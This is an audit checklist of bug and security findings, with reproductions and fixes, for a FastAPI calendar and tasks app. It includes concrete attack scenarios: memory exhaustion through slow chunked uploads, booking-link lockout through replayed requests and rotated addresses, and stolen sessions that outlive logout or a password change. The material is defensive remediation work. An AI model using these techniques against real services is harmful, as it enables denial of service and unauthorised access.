fix: `RateLimiter.release`, a reservation taken before the await, and
`book_slot` returning `(confirmation, created)` so a replay is distinguishable
from a write. Also: the occurrence cap is now derived from the window and
raises instead of truncating, `_link_busy` treats a series it could not expand
as blocking rather than as free, floating times are read in a new
`home_timezone` setting rather than in each link's own zone, and the booking
page mints its idempotency key once per chosen slot.

**Cluster #46 — frontend time correctness — closed 6.** The HIGH was a
wire-contract decision rather than a patch: `shiftIso` committed in its own
docstring to returning floating local time, and it backs every drag and resize
path. It now preserves the instant when the source value carries one, so
`DTSTART;TZID=Europe/Berlin` survives a drag instead of being rewritten as a
naive local string; floating values stay floating. Also: a DURATION-only event
keeps its span across an edit (and the write omits `end` entirely when the span
cannot be derived), `bucketByDay` orders a cell by the instant each start names
rather than by the wire string, `j()` renders a pydantic 422 as readable text
instead of "[object Object]", and the two `hooks.ts` findings closed by deleting
dead code and covering what was left.

**Cluster #43 — iCalendar series editing — closed 5.** All five were the repo's
own invariant #2 failing in a different way: never lose what another client
authored. An UNTIL is now shifted in the series' own zone rather than in UTC, so
dragging a bounded zone-aware series across a DST edge no longer drops its last
occurrence; deleting one occurrence no longer destroys a `RANGE=THISANDFUTURE`
override and with it every later occurrence's values; `split_series` rejects an
all-day/timed switch with the same ValueError `shift_series` raises (a clean 422
rather than an unhandled TypeError); `_event_duration` goes through
`_comparable`, so a mixed-type or mixed-awareness DTSTART/DTEND no longer makes
an event permanently uneditable; and a split at the first occurrence returns no
head at all, so the engine DELETEs the resource instead of leaving a husk that
expands to nothing and can never be removed.

**Cluster #44 — recurrence expansion, cache integrity and startup — closed 5**
(its sixth, `expand_occurrences`, went with #42). `gc_orphans` takes a
collection scope, so one clean collection can no longer sweep the orphans
another collection's poison resource was protecting; `items` records the FTS
rowid so an upsert deletes by rowid instead of scanning the whole FTS table,
which is what made a full resync O(n^2) under the global lock; `bootstrap` has
the same per-collection tolerance `sync_all` always had, so a bad collection or
an unreachable Radicale no longer takes startup down with it;
`_thisandfuture_shifts` — and `edit._tf_shift`, its write-path twin with the
identical gap — guard tz-awareness as well as dateness; and `discover` reports
whether the live collection set moved, so a list deleted on another device
finally reaches the open tab.

**Cluster #47 — tasks view and bulk add — closed 6**, including the
day-column-drag test gap that was in no cluster issue. Two of the six needed
re-scoping first (see their entries): main's 2026-08-14 merge had already taken
the duplicate row and the `childrenOf` rescan, leaving a flattened tree and a
per-row `colorOf` scan respectively. The rest as filed: a multi-line paste
regenerates the row's idempotency id, `toggleShared` compares slot values by
value (a shared `sameValue` in util.ts, replacing the copy in TaskModal), and a
failed list delete restores the group membership as well as the list.

**Cluster #48 — untrusted color into the CSSOM — closed 6.** The beacon is
closed at both layers: `dav/xml.py` gains a `clean_color` the read path applies
at ingest and the write path now shares, so the app no longer refuses to write
what it happily reads back, and `cssColor` in util.ts guards every inline-style
site on the client — applied at the ACCESSOR in each component rather than at
each style site, so a new consumer inherits it. That includes the `boxShadow`
shorthand in Sidebar, where a wire value escapes the property boundary most
freely. The rest: the public page names the zone when a fall-back hour repeats
(and carries that label through to the confirmation card), moving an event into
a hidden calendar reveals it, the scheduling fetch got the staleness guard that
was the last one missing, and `.appear-text` is back at the mobile 16px floor.

**All 41 findings from the 2026-08-07 sweep are now closed.**


### HTTP API surface

#### [x] Unauthenticated request bodies are buffered whole before any length bound or rate limiter runs — a single anonymous POST /api/login can exhaust memory

`backend/tasksd/app.py:1177` (`login`) · **high** · security

`login` (app.py:987-1019) and `public_booking_book` (app.py:1093-1121) declare a
pydantic body parameter (`body: Login`, `body: PublicBook`). FastAPI resolves that
dependency — which calls `await request.json()` and therefore buffers the ENTIRE request
body into a Python bytearray — *before* the endpoint function ever executes. Every guard
the file has for these routes lives inside the function body:
`authenticator.limiter.attempt(key)` (app.py:996), the `login_hashes` semaphore (1005),
`_public_throttle` (1095), `_gate` (1096). `Login.username`/`Login.password` carry
`max_length` bounds (app.py:61-62) whose stated purpose is exactly this ("a rejected
guess could still make the server hash a multi-megabyte body"), but pydantic only sees
the string after the whole body is already resident. Nothing upstream caps it either:
deploy/Caddyfile.snippet's `handle { reverse_proxy 127.0.0.1:8080 }` sets no
`request_body max_size`, and uvicorn has no body limit. There is also no concurrency
cap, so N simultaneous uploads multiply the resident set, and a slowloris-style trickle
pins that memory for as long as the attacker keeps the connection open — during which
the rate limiter, which is the intended defence, has still not been reached.

<details><summary>Evidence</summary>

```
Measured against the real app under uvicorn 0.52 (no auth needed, no valid credentials needed):

    POST /api/login HTTP/1.1
    Content-Type: application/json
    Transfer-Encoding: chunked

    {"username":"a","password":"aaaa…   <- streamed 1 MB at a time

    rss before:            105 MiB
    after   1 MB streamed: 105 MiB
    after  51 MB streamed: 146 MiB
    after 101 MB streamed: 194 MiB
    after 151 MB streamed: 240 MiB      (peak)

RSS tracks the streamed body ~1:1. The request was never completed, so `authenticator.limiter.attempt()` never ran and no 429 was ever issued. Cloudflare's edge caps one body at 100 MB, but there is no limit on how many such connections are open at once: ~20 concurrent slowloris uploads pin ~2 GB and OOM-kill the process, from anonymous internet traffic, with the app's own rate limiter structurally unable to fire. `test_oversized_login_body_is_rejected` (tests/test_security.py:227) sends a 5 000-char *password* and asserts 422 — it exercises the pydantic bound, never the body-size path, so the suite is green.
```

</details>

**Suggested fix.** Cap the request body before it is buffered. Cheapest correct fix: add `request_body {
max_size 1MB }` to the `handle { reverse_proxy 127.0.0.1:8080 }` block in
deploy/Caddyfile.snippet (and a smaller cap on the two anonymous routes if they get
their own matcher). Belt-and-braces in-process: a small ASGI middleware that rejects
with 413 when `content-length` exceeds a limit and that counts bytes off `receive()` for
chunked bodies, mounted ahead of the router. Add a test that a 10 MB body to /api/login
returns 413 without the process growing.

#### [x] Every DELETE route sends a body on a 204, raising RuntimeError inside the ASGI app and killing the connection on each delete

`backend/tasksd/app.py:741` · **medium** · bug · `minor`

All four 204 routes return `JSONResponse(status_code=204, content=None)` — app.py:741
(`delete_list`, serving both `/api/lists/{id}` and `/api/calendars/{id}`), 796
(`delete_task`), 885 (`delete_event`), 923 (`delete_booking_link`).
`JSONResponse.render(None)` produces the 4-byte body `b"null"`, while
`Response.init_headers` deliberately omits `content-length` for status 204. Starlette
then still sends `{"type": "http.response.body", "body": b"null"}`, and uvicorn's
httptools protocol — which has computed an expected content length of 0 — raises
`RuntimeError("Response content longer than Content-Length")`. The status line and
headers are already on the wire, so the client sees a plausible 204, but uvicorn logs a
full `ERROR: Exception in ASGI application` traceback and tears down the keep-alive
connection. Every single delete the user performs produces one of these, which is both
log noise that buries genuine ASGI errors and a forced TCP/tunnel reconnect per delete.

<details><summary>Evidence</summary>

```
Real uvicorn (not TestClient), authenticated session, one DELETE per row:

    delete task:  204 ct=application/json body=b''
    delete event: 204 ct=application/json body=b''
    delete link:  204 ct=application/json body=b''
    delete list:  204 ct=application/json body=b''

server log, once per delete:

    ERROR:    Exception in ASGI application
      File ".../starlette/responses.py", line 167, in __call__
        await send({"type": "http.response.body", "body": self.body})
      File ".../uvicorn/protocols/http/httptools_impl.py", line 544, in send
        raise RuntimeError("Response content longer than Content-Length")
    RuntimeError: Response content longer than Content-Length

Raw socket confirms the connection is dropped after the 204 (a pipelined follow-up on the same socket gets no response). The whole test suite misses it because `TestClient`'s in-process ASGI transport does not enforce content-length — `test_api.py`'s deletes assert only `r.status_code == 204` and stay green.
```

</details>

**Suggested fix.** Return a bodyless response: `from fastapi.responses import Response` and `return
Response(status_code=204)` at app.py:741, 796, 885, 923. Add a regression test that runs
the app under a real uvicorn (or asserts the ASGI messages) and checks a DELETE emits
exactly one empty `http.response.body`.

#### [x] Repeat.repeat_interval / repeat_count are unbounded ints — POST /api/calendars/{id}/events 500s on an out-of-range value, and a negative COUNT writes an RRULE the app can never expand

`backend/tasksd/app.py:144` · **medium** · bug · `minor`

`Repeat` (app.py:141-146) is the only model in the file whose numeric fields carry no
bounds: `repeat_interval: int = 1` and `repeat_count: int | None = None`, next to
`CreateBookingLink` where every integer has `ge`/`le`. `rrule_from_spec`
(ical/edit.py:68-71) passes them straight into the RRULE dict, and
`icalendar.prop.integer` enforces RFC 5545's int32 range at serialization time by
raising a bare `ValueError`. `patch_event` wraps the call in `try/except ValueError ->
HTTPException(422)` (app.py:856-858); `post_event` (app.py:826-836) does not, so the
ValueError escapes every registered handler and becomes a 500. Separately,
`rrule_from_spec` guards `interval` with `> 1` but guards `count` only with truthiness,
so a negative count is written verbatim: `RRULE:FREQ=DAILY;COUNT=-3`. That resource is
then permanently unexpandable by this app's own reader and by any dateutil-based CalDAV
client.

<details><summary>Evidence</summary>

```
Against the real app (authenticated):

    POST /api/calendars/{cal}/events {"summary":"x","start":"2026-01-04T09:00","repeat":"daily","repeat_count":2147483648}   -> 500
    POST ... {"repeat":"daily","repeat_interval":2147483648}                                                                  -> 500
    POST ... {"repeat":"daily","repeat_count":-2147483649}                                                                    -> 500
    POST ... {"repeat":"daily","repeat_count":2147483647}                                                                     -> 201
    PATCH /api/calendars/{cal}/events/{uid} {"repeat":"daily","repeat_count":10**12}                                          -> 422   (the asymmetry)

  ValueError: Integer 1000000000000 is outside the RFC 5545 range [-2147483648, 2147483647]
    at icalendar/prop/integer.py:101, reached from app.py:830 post_event -> engine.create_event -> ical.build_new_event

Negative count, accepted with 201:

    POST ... {"summary":"x","start":"2026-01-03T09:00","repeat":"daily","repeat_count":-3}   -> 201
    stored: RRULE:FREQ=DAILY;COUNT=-3
    recur.expand_occurrences(raw, date(2026,1,1), date(2026,2,1))
      -> BadRuleStringFormat: UNTIL parameter is missing: FREQ=DAILY;COUNT=-3

so `events_in_range` falls into its except branch and renders the master row forever — the event exists on the calendar but its series can never be projected.
```

</details>

**Suggested fix.** Bound the model: `repeat_interval: int = Field(default=1, ge=1, le=1000)` and
`repeat_count: int | None = Field(default=None, ge=1, le=1000)`. Also wrap
`post_event`'s `_run(create_event, ...)` in the same `except ValueError ->
HTTPException(422)` that `patch_event` already uses, so any other icalendar-level
rejection is a 4xx rather than a 500. Add API tests for the int32 boundary and for a
negative count.

#### [x] Sidecar.estimated_minutes is unbounded — a large integer 500s on PUT .../sidecar (the same class of bug sort_order was already fixed for)

`backend/tasksd/app.py:137` · **medium** · bug · `minor`

`Sidecar.sort_order` carries `Field(default=None, allow_inf_nan=False)` with a comment
explaining that a value which survives JSON parsing but not the storage/serialization
round-trip 500s every later read of the whole list. The sibling field
`estimated_minutes: int | None = None` (app.py:137) has no bounds at all, and Python
ints are arbitrary precision, so anything past 2^63-1 reaches `store.set_sidecar`'s
parameterised UPDATE and sqlite3 raises `OverflowError`. `OverflowError` is not
`ValueError` and is not one of the registered handlers, so it escapes as a 500 rather
than the 422 the analogous `sort_order` case now returns.

<details><summary>Evidence</summary>

```
Against the real app (authenticated):

    PUT /api/lists/{list}/tasks/{uid}/sidecar {"estimated_minutes": 10**30}   -> 500

    Traceback (most recent call last):
      File "backend/tasksd/app.py", line 802, in put_sidecar
        return await _run(_svc(request).set_sidecar, href, uid, **fields)
      File "backend/tasksd/service.py", line 369, in set_sidecar
        store.set_sidecar(self._conn, href, uid, **fields)
      File "backend/tasksd/db/store.py", line 333, in set_sidecar
        conn.execute(
    OverflowError: Python int too large to convert to SQLite INTEGER

`test_required_window_bounds_and_non_finite_sidecar_are_422` (tests/test_api.py:644) covers the `sort_order` half of this model and asserts 422; nothing probes `estimated_minutes`.
```

</details>

**Suggested fix.** `estimated_minutes: int | None = Field(default=None, ge=0, le=100_000)` (any sane upper
bound — an estimate in minutes never needs more). Extend the existing sidecar test with
the oversized-int case alongside the non-finite-float one.

#### [x] PUT .../tasks/{uid}/sidecar answers 200 null for an unknown uid and writes a sidecar row gc_orphans can never reclaim

`backend/tasksd/app.py:983` (`put_sidecar`) · **low** · bug · `minor`

`put_sidecar` (app.py:798-802) is the only write route in the file that does not check
the item exists. `_href` 404s an unknown list, but the uid is passed straight to
`store.set_sidecar`, which does `INSERT OR IGNORE INTO sidecar (collection_href, uid)`
with no referential check (store.py:328-331). The route then returns
`service.get_task(href, uid)`, which is `None` for a uid that is not there — so the
response is HTTP 200 with the body `null`, while `get_one_task` (app.py:771),
`patch_task` (779), `complete_task` and `cancel_task` all 404 the same uid. The row that
gets written has `orphaned_at IS NULL`, and `orphan_sidecar` is only ever called when a
*known* item is deleted, so `gc_orphans` (store.py:307-314, `WHERE orphaned_at IS NOT
NULL`) can never sweep it. The sidecar table is documented as the one part of SQLite a
resync cannot rebuild, so these rows are permanent.

<details><summary>Evidence</summary>

```
Against the real app (authenticated):

    PUT /api/lists/{list}/tasks/does-not-exist@x/sidecar {"pinned":true,"kanban_column":"doing"}
      -> 200  null                    <- no 404, and the caller cannot tell the write missed
    GET   /api/lists/{list}/tasks/does-not-exist@x   -> 404 {"detail":"unknown task does-not-exist@x"}
    PATCH /api/lists/{list}/tasks/does-not-exist@x   -> 404
    POST  /api/lists/{list}/tasks/does-not-exist@x/complete -> 404

    sqlite> select collection_href, uid, pinned, kanban_column, orphaned_at from sidecar;
    ('/testuser/5f6b0e6e/', 'does-not-exist@x', 1, 'doing', None)

    # 50 more such calls
    count(sidecar) = 51
    store.gc_orphans(conn, keep_days=0) -> 0 rows removed
    count(sidecar) = 51

Realistic trigger: any API client (the route is part of the shipped surface; today's SPA does not call it) writing a kanban column or pin for a task another CalDAV client deleted between the last poll and the write gets a false 200 and leaves a row behind forever.
```

</details>

**Suggested fix.** Mirror the sibling routes: `dto = await _run(_svc(request).set_sidecar, href, uid,
**fields)` then `if dto is None: raise HTTPException(404, f"unknown task {uid}")`.
Better, check existence before writing (`store.get_item(conn, href, uid)`) inside
`TaskService.set_sidecar` so no row is created at all, and add a test asserting an
unknown uid 404s and leaves `count(sidecar)` unchanged.

#### [x] Test gap: the SSE endpoint /api/events has no backend test at all, including its per-connection cleanup

`backend/tasksd/app.py:1144` (`events`) · **low** · test-gap

`GET /api/events` (app.py:954-979) is the only long-lived endpoint in the app and the
only one holding unbounded per-connection state: `svc.subscribe()` (service.py:87-90)
adds an unbounded `asyncio.Queue` to `TaskService._listeners`, which `_publish`
(service.py:95-100) fans every mutation into, and the only thing that ever removes it is
the `finally: svc.unsubscribe(queue)` inside the async generator. Whether that `finally`
runs on an abrupt client disconnect depends entirely on Starlette's generator-
finalisation path for the negotiated ASGI spec version — behaviour that is version-
specific and invisible to the code. `grep -rn 'api/events\|subscribe\|text/event-stream'
backend/tests/` returns nothing: no test that the stream opens, that it emits `hello`,
that a published mutation is delivered, that the 15 s keepalive fires, or that the
listener set drains on disconnect. The frontend's `api.test.ts` only exercises a fake
`EventSource`, so the server half is entirely unverified.

<details><summary>Evidence</summary>

```
I verified the behaviour is correct TODAY by hand, under real uvicorn 0.52 / starlette 1.4.1:

    listeners before:            {"n":0}
    3 raw sockets open on /api/events, hello received
    with 3 open:                 {"n":3,"qsizes":[0,0,0]}
    sockets closed abruptly (no graceful shutdown)
    2s after close:              {"n":0}

That is exactly the property a test should pin. A Starlette/uvicorn upgrade that changes the disconnect path (spec_version >= 2.4 skips `listen_for_disconnect` entirely and relies on `send()` raising), or a refactor that moves `svc.subscribe()`/the `try/finally` around, would silently start leaking one queue per dropped SSE connection — every mobile tab switch, every tunnel blip — and the whole suite would stay green. Each leaked queue then accumulates every subsequent published event forever.
```

</details>

**Suggested fix.** Add an SSE suite: (1) open the stream, assert `retry: 3000` and `data: {"type":"hello"}`
arrive and `len(svc._listeners) == 1`; (2) trigger a mutation on another connection and
assert the corresponding event is delivered on the stream; (3) close the client abruptly
and assert `svc._listeners` drains within a bounded wait — this is the regression guard.
Run it against a real uvicorn (or drive the ASGI app directly with a `receive` that
yields `http.disconnect`), since TestClient's transport does not reproduce the
disconnect path.


### Auth + session

#### [x] Logout does not close an already-open SSE stream — a revoked session keeps receiving live change events forever

`backend/tasksd/app.py:1152` (`events`) · **medium** · security · `minor`

`require_auth` runs once, at SSE connect time. The `/api/events` generator then loops
forever with no further reference to the authenticator, so revocation (POST /api/logout,
which is the ONLY mechanism that makes a stolen cookie stop working) never reaches an
in-flight stream. Every ordinary request from the revoked cookie 401s, but the stream
established before the logout keeps delivering `{"type":..., "list":..., "uid":...}` for
every task/event create/update/delete indefinitely. Nothing tears it down: the 15s `:
keepalive` writes defeat Cloudflare's and Caddy's idle timeouts, so the only thing that
ends it is the attacker closing it or a process restart. The revocation test suite
(test_security.py:236-281) only replays the cookie against `/api/me` and `/api/lists` —
no test opens a stream before logging out, which is why this survived the logout-
invalidation pass.

<details><summary>Evidence</summary>

```
backend/tasksd/app.py:954-979 — the route takes its auth from the router dependency and never re-checks:

    @api.get("/events")
    async def events(request: Request):
        svc = _svc(request)
        queue = svc.subscribe()
        async def gen():
            try:
                yield "retry: 3000\n\n"
                yield f"data: {json.dumps({'type': 'hello'})}\n\n"
                while True:
                    if await request.is_disconnected():
                        break
                    try:
                        ev = await asyncio.wait_for(queue.get(), timeout=15)
                    except asyncio.TimeoutError:
                        yield ": keepalive\n\n"; continue
                    yield f"data: {json.dumps(ev)}\n\n"
            finally:
                svc.unsubscribe(queue)

Reproduced against the real app under uvicorn (auth on, session_secret='s'*40, TaskService.bootstrap stubbed so no Radicale is needed):

  login: 200
  sse status: 200
    << data: {"type": "hello"}
  logout: 200 {'authenticated': False}
  /api/me    with the revoked cookie: 401
  /api/lists with the revoked cookie: 401
    << data: {"type": "task_created", "list": "after-logout", "uid": "secret-uid@x"}
  RESULT: the REVOKED session's SSE stream is STILL delivering live events

Failure scenario: the owner's cookie is copied off a shared/lost machine. The thief opens `GET /api/events` and leaves it open. The owner clicks Log out; `Authenticator.revoke()` + `revoked_sessions
```

</details>

**Suggested fix.** Give the route the cookie (`session: str | None = Cookie(default=None,
alias="tasks_session")`) and re-verify inside the loop, e.g. right after the
`is_disconnected()` check and again before each `yield`: `if authenticator is not None
and not authenticator.verify_session(session): break`. The keepalive path already wakes
every 15 s, so a revoked stream dies within one keepalive interval and the same check
also retires a stream whose JWT `exp` passed. Add a test: login, open the stream,
logout, publish, assert nothing arrives.

#### [x] Changing the app password (or username) does not invalidate existing sessions, and there is no sign-out-everywhere

`backend/tasksd/auth.py:228` (`session_claims`) · **medium** · security

**Fixed, with two deviations from the suggestion below.** The `cv` claim is
keyed with the signing secret (HMAC) rather than a bare `sha256(hash)[:16]`: on
the `TASKS_AUTH_PASSWORD` dev path the credential material is a plaintext
password, and a truncated unkeyed digest of it is offline-guessable by whoever
holds the token. And it fingerprints the *configured* credential rather than the
derived hash, because scrypt salts randomly — hashing the plaintext at startup
yields a different hash on every boot, so binding to it would have signed
everyone out on each ordinary restart. `docs/DEPLOY.md` now documents both
levers under "If the password leaks".

The session JWT carries only `sub`/`iat`/`exp`/`jti` and is signed with
`TASKS_SESSION_SECRET`, which is independent of the password hash. `session_claims`
verifies the signature, the expiry and the per-jti revocation list, but never compares
`claims['sub']` to `self._user` and has no notion of a credential version. So the
documented remedy for a credential compromise — regenerate the scrypt hash with `python
-m tasksd hash-password`, update `TASKS_AUTH_PASSWORD_HASH`, restart — leaves every
session an attacker already minted fully valid for the remainder of `TASKS_SESSION_TTL`
(7 days by default). Revocation only reaches tokens the owner physically holds (logout
revokes the jti in the cookie being presented); a session created on the attacker's
machine has a jti the owner never sees and therefore cannot name. There is no 'sign out
all devices' in the UI or the API, and nothing in docs/DEPLOY.md tells the operator that
rotating TASKS_SESSION_SECRET is the only way to actually cut access. For an internet-
facing app where the cookie is the entire perimeter, 'I changed my password' silently
doing nothing is the wrong failure mode.

<details><summary>Evidence</summary>

```
backend/tasksd/auth.py:199-225 — the claim set and the verification:

    def issue_session(self) -> str:
        now = datetime.now(timezone.utc)
        return jwt.encode({"sub": self._user, "iat": now,
                           "exp": now + timedelta(seconds=self._ttl),
                           "jti": secrets.token_hex(16)},
                          self._secret, algorithm="HS256")

    def session_claims(self, token):
        ...
        claims = jwt.decode(token, self._secret, algorithms=["HS256"])
        if self.is_revoked(claims.get("jti")): return None
        return claims          # <- nothing binds this to the current credentials

Run directly:

    a1 = Authenticator(user="admin", password_hash=hash_password("old-password"), secret="s"*40, ttl_s=3600)
    tok = a1.issue_session()
    a2 = Authenticator(user="admin", password_hash=hash_password("brand-new-password"), secret="s"*40, ttl_s=3600)
    a2.verify_session(tok)  -> True     # password fully changed, old token still good
    a3 = Authenticator(user="someone-else", password_hash=hash_password("brand-new-password"), secret="s"*40, ttl_s=3600)
    a3.verify_session(tok)  -> True     # username changed too, still good (no `sub` check)

Failure scenario: the owner's password leaks (reused in a breach, shoulder-surfed, typed on a compromised machine). The attacker POSTs /api/login once and gets a 7-day cookie with their own jti. The owner notices, runs `python -m tasksd hash-password`, updates /etc/tasks/tas
```

</details>

**Suggested fix.** Bind the token to the credentials it was minted under: put a short credential
fingerprint in the claims (e.g. `"cv":
hashlib.sha256(password_hash.encode()).hexdigest()[:16]`) and reject in `session_claims`
when it does not match the Authenticator's current hash — a password change then
invalidates every outstanding session on the next restart. Also add the missing
`hmac.compare_digest(claims.get("sub", ""), self._user)` check so a username change
invalidates too, and document rotating TASKS_SESSION_SECRET in docs/DEPLOY.md as the
immediate 'sign out everywhere' lever. Add a test asserting a token minted under the old
hash fails against an Authenticator built with a new one.


### Service layer

#### [x] Idempotent booking replays spend the per-link budget without landing a booking, restoring the link-lockout DoS the ceiling was rewritten to close

`backend/tasksd/service.py:792` (`book_slot`) · **medium** · security

`book_slot`'s replay branch returns `self._confirmation(link, prior)` — an ordinary
success value, indistinguishable at the route from a booking that actually wrote a
VEVENT. `public_booking_book` (app.py:1118-1120) charges the per-link limiter on *any*
non-None result: `if result is None: 404` …
`public_post_link_limiter.record_failure(f"link:{token}")`, under the comment "Charged
here: the booking landed on the owner's calendar." It did not. The per-link ceiling was
explicitly rewritten (app.py:1053-1067: "It counts BOOKINGS, not requests") to remove
the published-link denial-of-service recorded in docs/AUDIT.md; the replay path
reintroduces it, because a replay costs the attacker nothing and spends one of the
link's 30 bookings/hour. `book_slot` needs to tell the route whether anything was
created (e.g. return the confirmation plus a `replayed` flag, or a distinct sentinel) so
the route charges only real writes.

<details><summary>Evidence</summary>

```
service.py:725-730 —
```
if client_id:
    prior = store.get_booking_by_event(self._conn, f"{client_id}@tasksd")
    if prior is not None:
        if prior["link_token"] == token:
            return self._confirmation(link, prior)   # <- success, nothing written
```
app.py:1093-1121 — the only exit that skips the charge is `result is None` (unknown/disabled link) or an exception (SlotTaken -> 409, ValueError -> 422). A replay is none of those; tests/test_scheduling.py:500-504 asserts a replay returns **201**, so `record_failure(f"link:{token}")` runs.

Failure scenario: the owner publishes https://host/book/<token> (public by design; the limiter comment says holding the token proves nothing). A visitor books once with `client_id = c` — 1 real event, 1 credit. They then POST the identical body 29 more times. Each returns 201 with the original confirmation, writes nothing, and spends a credit. At 30, `link:<token>` locks for `lockout_s=1800`, and every genuine visitor gets 429 "too many requests". The per-client limiter (`max_fails=15, window_s=3600`) is the only other brake, and tests/test_scheduling.py:623-644 (`many_ips`) already demonstrates that varying the source address defeats it. Sustaining 30 replays per 30 minutes — one real booking total, then pure replays — keeps the link permanently unbookable while the owner sees only 429s.

Test gap: `test_refused_bookings_do_not_spend_the_links_budget` (test_scheduling.py:664) covers 409/422 refusals only; no test sends a repla
```

</details>

**Suggested fix.** Make the replay distinguishable from a create. E.g. have `book_slot` return
`{**confirmation, "replayed": True}` (or a second return value), and in
`public_booking_book` call `public_post_link_limiter.record_failure(f"link:{token}")`
only when the result is a fresh booking. Add a test that books once, replays 40 times,
and asserts a different address can still book (mirroring
`test_refused_bookings_do_not_spend_the_links_budget`).

#### [x] bootstrap() has no per-collection error handling, so one unreachable or vanished collection aborts application startup entirely

`backend/tasksd/service.py:103` (`bootstrap`) · **medium** · bug

`bootstrap` runs `self._engine.discover()` and then `self._engine.sync(href)` for every
collection, all inside one `with self._lock` and with no `try`. Any exception propagates
out of `bootstrap` -> out of the FastAPI lifespan (`await
asyncio.to_thread(svc.bootstrap)`, app.py:611, unguarded) -> uvicorn reports startup
failure and exits. `sync_all` (service.py:117-130) guards the exact same two failure
modes deliberately — `except DavNotFound: # Deleted from under us between slices;
discover next pass` and `except Exception: log.warning(...); store.set_sync_error(...)`
with the comment "one bad collection must not stall the rest of the sweep". bootstrap
has neither, so a transient Radicale hiccup or a single bad collection takes down the
whole listener, including `/healthz`, `/api/login`, the SPA, and every read path — all
of which are pure SQLite against the already-populated cache and would otherwise work
fine.

<details><summary>Evidence</summary>

```
service.py:103-107:
```
def bootstrap(self) -> None:
    with self._lock:
        self._engine.discover()
        for row in store.get_collections(self._conn):
            self._engine.sync(row["href"])
```
app.py:605-612 (lifespan): `await asyncio.to_thread(svc.bootstrap)` with no try/except.

Reproduced against the real app factory (stubbing only the DAV transport) — another CalDAV client with equal rights deletes a collection in the window between `discover()` and its `sync()`, so the sync REPORT 404s:
```
davc.DavClient.list_collections = lambda self: [CollectionInfo(href='/u/gone/', displayname='Gone', components={'VTODO'})]
davc.DavClient.sync_collection = lambda self, href, token: (_ for _ in ()).throw(NotFound(f'404 for {href}'))
with TestClient(create_app(settings)) as c: c.get('/healthz')
-> STARTUP FAILED: NotFound 404 for /u/gone/
```
The same happens for the far more common case of Radicale not being up yet (or restarting) when tasksd starts: `discover()` -> `list_collections()` raises a DavError and the app refuses to boot rather than serving the cache and retrying in `_sync_loop`, which already swallows sync errors (app.py:529-534).
```

</details>

**Suggested fix.** Give `bootstrap` the same tolerance `sync_all` has: wrap `discover()` and each per-
collection `sync()` in try/except, log + `store.set_sync_error` on failure, and let
`_sync_loop` retry. Startup should only hard-fail on configuration errors, never on the
state of the CalDAV server. Add a test asserting `create_app` starts and `/healthz`
answers when `list_collections`/`sync_collection` raise.


### iCalendar edit path

#### [x] shift_series moves a UTC UNTIL by the wall-clock delta, so dragging a zone-aware bounded series across a DST edge silently deletes its last occurrence(s)

`backend/tasksd/ical/edit.py:777` (`_shift_rrule`) · **medium** · bug

`_shift_rrule` shifts UNTIL with `u + delta`, where `delta` is the *wall-clock* offset
computed by `_wall_delta`. DTSTART is shifted the same way, but DTSTART is zone-aware
(TZID) so `dt + delta` preserves wall clock and its UTC instant moves by `delta ± the
DST change`, while UNTIL is a UTC instant that moves by exactly `delta`. When the shift
carries occurrences across a DST transition the two disagree by an hour and UNTIL lands
*before* the final generated slot, which is then dropped. `_set_rrule`/`_coerce_until`
do not repair this: an already-UTC UNTIL is passed through unchanged. `edit.rrule` is
UNSET on this path (a drag sends only start/end via `dragBody`; the modal's repeat
select defaults to 'keep' and `repeatFields()` returns `{}` for an existing series), so
`_shift_rrule` really is the only writer of the rule and nothing downstream overwrites
the damage.

<details><summary>Evidence</summary>

```
edit.py:706-708:
```
    if "UNTIL" in rule:
        rule["UNTIL"] = [u + delta for u in rule["UNTIL"]]
        changed = True
```
Reproduced against the repo's pinned deps (America/Chicago VTIMEZONE inline, exactly what `test_shift_series_dst_wall_clock_preserved` uses, but UNTIL-bounded instead of COUNT-bounded):

Input master: `DTSTART;TZID=America/Chicago:20261021T090000`, `DTEND;TZID=America/Chicago:20261021T093000`, `RRULE:FREQ=WEEKLY;UNTIL=20261028T140000Z` (two occurrences: 10/21 and 10/28, both CDT = 14:00Z).

User drags the 10/21 chip forward one week (`shift_series(raw, '2026-10-21T09:00:00-05:00', EventEdit(dtstart=2026-10-28T09:00-05:00, dtend=2026-10-28T09:30-05:00))`), i.e. delta = +7 days.

Output:
```
DTSTART;TZID=America/Chicago:20261028T090000
RRULE:FREQ=WEEKLY;UNTIL=20261104T140000Z
```
expand_occurrences(2026-10-01 .. 2026-12-15):
  before: ['2026-10-21T09:00:00-05:00', '2026-10-28T09:00:00-05:00']   (2 occurrences)
  after : ['2026-10-28T09:00:00-05:00']                                 (1 occurrence)

The 2026-11-04 occurrence is gone: it falls after the 11/01 fall-back, so it is 09:00 CST = 15:00Z, while UNTIL was moved only to 20261104T140000Z (= 08:00 CST). Half the series vanished from a single drag, and the loss is written to Radicale — the SQLite cache is not the source of truth, so it does not come back. The mirror case (dragging backwards across a spring-forward) drops the last occurrence the same way. No test covers UNTIL + DST: `test_shift_seri
```

</details>

**Suggested fix.** Shift UNTIL in the series' own zone rather than in UTC: re-express each UNTIL in
`master['DTSTART'].dt.tzinfo` (when DTSTART is zone-aware), add the wall-clock `delta`
there, then convert back to UTC — the same wall-clock discipline `_shift_value` already
applies to DTSTART. Leave floating and DATE-valued UNTILs on the current path. Add a
regression test asserting that a 7-day drag of a UNTIL-bounded America/Chicago series
across the 2026-11-01 fall-back keeps the same number of occurrences.

#### [x] Deleting one occurrence destroys a RANGE=THISANDFUTURE override, silently reverting every later occurrence to the master

`backend/tasksd/ical/edit.py:639` (`exclude_occurrence`) · **medium** · bug · `minor`

`exclude_occurrence` adds the EXDATE and then removes *any* override component whose
RECURRENCE-ID equals the anchor. For a plain single-slot override that is correct. For a
`RECURRENCE-ID;RANGE=THISANDFUTURE` override (RFC 5545 §3.2.13 — Apple Calendar's and
Thunderbird's "this and all future events"; the repo explicitly supports the shape, see
`recur._thisandfuture_shifts`), that one component carries the edits for its own slot
*and every later slot*. Deleting the single occurrence at its anchor therefore throws
away the times, summary, location and everything else the foreign client authored for
all subsequent occurrences, which silently snap back to the master's values. This is the
exact invariant-#2 loss the already-fixed `_shift_datelike` RANGE bug was about, on the
other write path.

<details><summary>Evidence</summary>

```
edit.py:581-588:
```
    cal.subcomponents = [
        c for c in cal.subcomponents
        if not (
            getattr(c, "name", "") == "VEVENT"
            and c.get("RECURRENCE-ID") is not None
            and _same_instant(c.get("RECURRENCE-ID").dt, anchor)
        )
    ]
```
